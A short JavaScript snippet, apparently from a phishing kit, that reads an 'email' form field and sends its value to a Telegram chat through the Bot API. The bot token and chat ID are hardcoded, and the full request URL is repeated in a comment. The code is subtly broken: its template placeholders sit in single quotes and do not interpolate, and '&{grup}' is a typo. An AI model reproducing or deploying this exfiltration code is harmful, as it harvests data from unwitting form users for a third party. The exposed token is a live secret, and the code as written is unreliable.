// https://api.telegram.org/bot7443909342:AAGNRaCJr28TXKMof6xrcKNtwsi5-he6LI8/sendMessage?chat_id=-4272332970&text=Hallo&parse_mode=html

//email%3A%0Assssssss


function kirimPesan() {
    var nama = document.getElementById('email');
    var gabungan = 'email%3A%0A' +email.value;
    var token = '7443909342:AAGNRaCJr28TXKMof6xrcKNtwsi5-he6LI8';
    var grup = '-4272332970';

    $.ajax({
        url: 'https://api.telegram.org/bot${token}/sendMessage?chat_id=&{grup}&text=${gabungan}&parse_mode=html' ,
        method: 'POST'
    })
}